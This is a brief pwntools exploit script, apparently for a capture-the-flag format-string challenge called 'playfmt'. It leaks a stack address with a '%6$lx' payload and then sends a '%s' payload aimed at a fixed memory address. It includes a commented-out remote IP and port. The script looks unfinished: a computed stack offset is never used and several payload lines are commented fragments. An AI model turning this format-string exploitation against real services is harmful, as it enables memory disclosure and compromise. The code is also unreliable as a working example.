from pwn import *

context.log_level = 'debug'
#p=remote("120.78.192.35",9999)
p=process('./playfmt')
p.recvuntil("=\n")
p.sendlineafter("=\n","%6$lx")
s="0x"+p.recvuntil("\n")
stack_addr=int(s.strip(),16)
print hex(stack_addr)
stack2=stack_addr+0xffffcf28-0xffffcef8-0x20
p.sendline("%"+p32(0x8050a10)+"c%6$s")
#p.sendline("c$hhn")
#p.sendline("$s")
p.interactive()
